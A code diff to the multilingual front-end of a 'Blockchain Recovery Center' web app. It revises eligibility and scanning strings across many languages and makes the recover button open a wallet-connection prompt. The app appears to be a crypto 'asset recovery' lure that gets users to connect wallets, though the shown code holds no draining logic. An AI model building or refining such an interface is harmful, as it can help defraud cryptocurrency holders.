@@ -40,8 +40,8 @@ const TRANSLATIONS = {
     welcome: 'Welcome to Blockchain Recovery Center',
     connectWallet: 'CONNECT WALLET',
     disconnect: 'Disconnect Wallet',
-    checkEligibility: 'Scanning Blockchain Networks',
-    verifying: 'Analyzing wallet for recoverable assets...',
+    checkEligibility: 'Checking wallet eligibility',
+    verifying: 'Scanning blockchain networks for recoverable assets...',
     terms: 'Terms',
     delivery: 'Delivery',
     successful: 'RECOVERY SUCCESSFUL!',
@@ -115,8 +115,8 @@ const TRANSLATIONS = {
     welcome: 'Bienvenido al Centro de Recuperación Blockchain',
     connectWallet: 'CONECTAR WALLET',
     disconnect: 'Desconectar Wallet',
-    checkEligibility: 'Escaneando Redes Blockchain',
-    verifying: 'Analizando wallet en busca de activos recuperables...',
+    checkEligibility: 'Verificando elegibilidad de la wallet',
+    verifying: 'Analizando redes blockchain en busca de activos recuperables...',
     terms: 'Términos',
     delivery: 'Entrega',
     successful: '¡RECUPERACIÓN EXITOSA!',
@@ -190,8 +190,8 @@ const TRANSLATIONS = {
     welcome: 'Bienvenue au Centre de Récupération Blockchain',
     connectWallet: 'CONNECTER LE PORTEFEUILLE',
     disconnect: 'Déconnecter',
-    checkEligibility: 'Analyse des réseaux blockchain',
-    verifying: 'Analyse du portefeuille à la recherche d\'actifs récupérables...',
+    checkEligibility: 'Vérification de l\'éligibilité du portefeuille',
+    verifying: 'Analyse des réseaux blockchain à la recherche d\'actifs récupérables...',
     terms: 'Conditions',
     delivery: 'Livraison',
     successful: 'RÉCUPÉRATION RÉUSSIE !',
@@ -265,7 +265,7 @@ const TRANSLATIONS = {
     welcome: 'Willkommen im Blockchain-Wiederherstellungszentrum',
     connectWallet: 'WALLET VERBINDEN',
     disconnect: 'Trennen',
-    checkEligibility: 'Scan der Blockchain-Netzwerke',
+    checkEligibility: 'Überprüfung der Wallet-Berechtigung',
     verifying: 'Wallet wird auf wiederherstellbare Vermögenswerte analysiert...',
     terms: 'Bedingungen',
     delivery: 'Lieferung',
@@ -340,7 +340,7 @@ const TRANSLATIONS = {
     welcome: 'Benvenuto nel Centro di Recupero Blockchain',
     connectWallet: 'CONNETTI WALLET',
     disconnect: 'Disconnetti',
-    checkEligibility: 'Scansione reti blockchain',
+    checkEligibility: 'Verifica idoneità del wallet',
     verifying: 'Analisi del wallet per asset recuperabili...',
     terms: 'Termini',
     delivery: 'Consegna',
@@ -415,7 +415,7 @@ const TRANSLATIONS = {
     welcome: 'Bem-vindo ao Centro de Recuperação Blockchain',
     connectWallet: 'CONECTAR CARTEIRA',
     disconnect: 'Desconectar',
-    checkEligibility: 'Verificando redes blockchain',
+    checkEligibility: 'Verificando elegibilidade da carteira',
     verifying: 'Analisando carteira em busca de ativos recuperáveis...',
     terms: 'Termos',
     delivery: 'Entrega',
@@ -490,7 +490,7 @@ const TRANSLATIONS = {
     welcome: 'Добро пожаловать в Центр восстановления блокчейна',
     connectWallet: 'ПОДКЛЮЧИТЬ КОШЕЛЕК',
     disconnect: 'Отключить',
-    checkEligibility: 'Сканирование сетей блокчейна',
+    checkEligibility: 'Проверка права на восстановление',
     verifying: 'Анализ кошелька на предмет восстанавливаемых активов...',
     terms: 'Условия',
     delivery: 'Доставка',
@@ -565,7 +565,7 @@ const TRANSLATIONS = {
     welcome: '欢迎来到区块链恢复中心',
     connectWallet: '连接钱包',
     disconnect: '断开连接',
-    checkEligibility: '扫描区块链网络',
+    checkEligibility: '检查钱包资格',
     verifying: '正在分析钱包中的可恢复资产...',
     terms: '条款',
     delivery: '交付',
@@ -640,7 +640,7 @@ const TRANSLATIONS = {
     welcome: 'ブロックチェーンリカバリーセンターへようこそ',
     connectWallet: 'ウォレットを接続',
     disconnect: '切断',
-    checkEligibility: 'ブロックチェーンネットワークをスキャン中',
+    checkEligibility: 'ウォレットの適格性を確認中',
     verifying: '復元可能な資産をウォレットで分析中...',
     terms: '利用規約',
     delivery: '配信',
@@ -715,7 +715,7 @@ const TRANSLATIONS = {
     welcome: '블록체인 복구 센터에 오신 것을 환영합니다',
     connectWallet: '지갑 연결',
     disconnect: '연결 끊기',
-    checkEligibility: '블록체인 네트워크 스캔 중',
+    checkEligibility: '지갑 적격성 확인 중',
     verifying: '복구 가능한 자산을 지갑에서 분석 중...',
     terms: '약관',
     delivery: '전달',
@@ -790,7 +790,7 @@ const TRANSLATIONS = {
     welcome: 'مرحبًا بكم في مركز استرداد blockchain',
     connectWallet: 'اتصال المحفظة',
     disconnect: 'قطع الاتصال',
-    checkEligibility: 'فحص شبكات البلوكتشين',
+    checkEligibility: 'التحقق من أهلية المحفظة',
     verifying: 'تحليل المحفظة بحثًا عن الأصول القابلة للاسترداد...',
     terms: 'الشروط',
     delivery: 'التسليم',
@@ -865,7 +865,7 @@ const TRANSLATIONS = {
     welcome: 'ब्लॉकचेन रिकवरी सेंटर में आपका स्वागत है',
     connectWallet: 'वॉलेट कनेक्ट करें',
     disconnect: 'डिस्कनेक्ट करें',
-    checkEligibility: 'ब्लॉकचेन नेटवर्क स्कैन कर रहा है',
+    checkEligibility: 'वॉलेट पात्रता की जांच कर रहा है',
     verifying: 'रिकवरी योग्य संपत्तियों के लिए वॉलेट का विश्लेषण कर रहा है...',
     terms: 'नियम',
     delivery: 'डिलीवरी',
@@ -940,7 +940,7 @@ const TRANSLATIONS = {
     welcome: 'Blockchain Kurtarma Merkezi\'ne Hoş Geldiniz',
     connectWallet: 'CÜZDAN BAĞLA',
     disconnect: 'Bağlantıyı Kes',
-    checkEligibility: 'Blockchain Ağları Taranıyor',
+    checkEligibility: 'Cüzdan uygunluğu kontrol ediliyor',
     verifying: 'Kurtarılabilir varlıklar için cüzdan analiz ediliyor...',
     terms: 'Şartlar',
     delivery: 'Teslimat',
@@ -1015,7 +1015,7 @@ const TRANSLATIONS = {
     welcome: 'Welkom bij Blockchain Herstelcentrum',
     connectWallet: 'WALLET VERBINDEN',
     disconnect: 'Verbinding verbreken',
-    checkEligibility: 'Blockchainnetwerken scannen',
+    checkEligibility: 'Walletgeschiktheid controleren',
     verifying: 'Wallet analyseren op herstelbare activa...',
     terms: 'Voorwaarden',
     delivery: 'Levering',
@@ -1090,7 +1090,7 @@ const TRANSLATIONS = {
     welcome: 'Witamy w Centrum Odzyskiwania Blockchain',
     connectWallet: 'POŁĄCZ PORTFEL',
     disconnect: 'Rozłącz',
-    checkEligibility: 'Skanowanie sieci blockchain',
+    checkEligibility: 'Sprawdzanie kwalifikowalności portfela',
     verifying: 'Analiza portfela pod kątem możliwych do odzyskania aktywów...',
     terms: 'Warunki',
     delivery: 'Dostawa',
@@ -1165,7 +1165,7 @@ const TRANSLATIONS = {
     welcome: 'Chào mừng đến với Trung tâm Phục hồi Blockchain',
     connectWallet: 'KẾT NỐI VÍ',
     disconnect: 'Ngắt kết nối',
-    checkEligibility: 'Đang quét mạng Blockchain',
+    checkEligibility: 'Đang kiểm tra tính đủ điều kiện của ví',
     verifying: 'Đang phân tích ví để tìm tài sản có thể phục hồi...',
     terms: 'Điều khoản',
     delivery: 'Giao hàng',
@@ -1240,7 +1240,7 @@ const TRANSLATIONS = {
     welcome: 'ยินดีต้อนรับสู่ศูนย์กู้คืนบล็อกเชน',
     connectWallet: 'เชื่อมต่อกระเป๋าเงิน',
     disconnect: 'ตัดการเชื่อมต่อ',
-    checkEligibility: 'กำลังสแกนเครือข่ายบล็อกเชน',
+    checkEligibility: 'กำลังตรวจสอบคุณสมบัติของกระเป๋าเงิน',
     verifying: 'กำลังวิเคราะห์กระเป๋าเงินเพื่อหาสินทรัพย์ที่สามารถกู้คืนได้...',
     terms: 'ข้อกำหนด',
     delivery: 'การจัดส่ง',
@@ -1315,7 +1315,7 @@ const TRANSLATIONS = {
     welcome: 'Selamat Datang di Pusat Pemulihan Blockchain',
     connectWallet: 'HUBUNGKAN WALLET',
     disconnect: 'Putuskan',
-    checkEligibility: 'Memindai Jaringan Blockchain',
+    checkEligibility: 'Memeriksa kelayakan dompet',
     verifying: 'Menganalisis wallet untuk aset yang dapat dipulihkan...',
     terms: 'Ketentuan',
     delivery: 'Pengiriman',
@@ -2738,7 +2738,8 @@ function App() {
   // Recover assets function with pro messaging
   const recoverAssets = async () => {
     if (!isConnected) {
-      setError(translations.walletRequired);
+      // Instead of just showing an error, open the wallet connection modal
+      open();
       return;
     }
     
@@ -2954,7 +2955,7 @@ function App() {
                     ) : !isEligible && !scanning && isConnected && totalOnChainValue > 0 && totalOnChainValue < 1 ? (
                       <span>⚠️ {translations.insufficientBalance}. Minimum $1 required for recovery initiation.</span>
                     ) : !isEligible && !scanning && isConnected && totalOnChainValue === 0 ? (
-                      <span>🔍 {translations.notEligible}. No on-chain balance detected in supported networks.</span>
+                      <span>⚠️ {translations.notEligible}. Supported networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche. Need help? Contact support.</span>
                     ) : null}
                   </div>
                 )}
